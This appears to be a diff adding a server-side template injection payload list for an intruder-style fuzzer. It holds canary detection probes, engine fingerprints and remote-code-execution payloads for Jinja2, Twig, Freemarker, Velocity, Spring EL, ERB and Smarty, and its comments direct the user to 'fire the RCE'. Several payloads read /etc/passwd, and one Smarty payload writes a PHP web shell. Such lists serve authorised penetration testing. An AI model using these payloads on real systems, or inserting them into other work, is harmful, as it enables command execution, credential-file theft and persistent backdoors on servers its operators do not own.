@@ -1,0 +1,81 @@
+# ==================================================================
+#  SSTI PAYLOADS — Server-Side Template Injection (single file)
+#  One payload per line. "#" lines are comments (pyintruder skips them).
+#  Detection: set grep to  xq9z  — the canary probes carry marker+math, so a
+#  response containing  xq9z49  (or xq9z7777777) means the template EVALUATED
+#  your input = SSTI confirmed. Then fingerprint + fire the RCE for that engine.
+#  Note: Velocity/#-leading payloads are written with %23 so they transmit raw.
+# ==================================================================
+
+# ---- 0. CANARY / detection (set grep = xq9z ; look for xq9z49 / xq9z7777777) ----
+xq9z{{7*7}}
+xq9z${7*7}
+xq9z<%=7*7%>
+xq9z${{7*7}}
+xq9z{{7*'7'}}
+xq9z{{7*7}}${7*7}<%=7*7%>
+
+# ---- 1. Plain detection probes ----
+{{7*7}}
+${7*7}
+<%=7*7%>
+${{7*7}}
+{{7*'7'}}
+{{7*7}}${7*7}
+${class.getClassLoader()}
+{{.}}
+
+# ---- 2. Engine fingerprint tells ----
+{{settings}}
+{{config}}
+{{_self}}
+{{app}}
+${T(java.lang.System).getenv()}
+
+# ---- 3. Jinja2 (Python) RCE ----
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{lipsum.__globals__.os.popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}
+
+# ---- 4. Twig (PHP) RCE ----
+{{['id']|filter('system')}}
+{{['id',1]|sort('system')}}
+{{['id']|map('system')|join}}
+{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
+{{['cat /etc/passwd']|filter('system')}}
+
+# ---- 5. Freemarker (Java) RCE ----
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+${"freemarker.template.utility.Execute"?new()("id")}
+[#assign ex='freemarker.template.utility.Execute'?new()]${ex('id')}
+
+# ---- 6. Velocity (Java) RCE  (%23 = leading '#') ----
+%23set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
+%23set($x="")$x.class.forName("java.lang.Runtime").getRuntime().exec("id")
+
+# ---- 7. Spring EL / Java EL ----
+${T(java.lang.Runtime).getRuntime().exec('id')}
+*{T(java.lang.Runtime).getRuntime().exec('id')}
+${T(java.lang.Runtime).getRuntime().exec(new java.lang.String[]{'bash','-c','id'})}
+${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null)}
+
+# ---- 8. ERB (Ruby) RCE ----
+<%= system('id') %>
+<%= `id` %>
+<%= IO.popen('id').read %>
+<%= Kernel.system('id') %>
+
+# ---- 9. Smarty (PHP) RCE ----
+{php}system('id');{/php}
+{system('id')}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['c']); ?>",self::clearConfig())}
+
+# ---- 10. Other / generic ----
+${@print(system("id"))}
+{{= 7*7}}
+[[${7*7}]]
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}
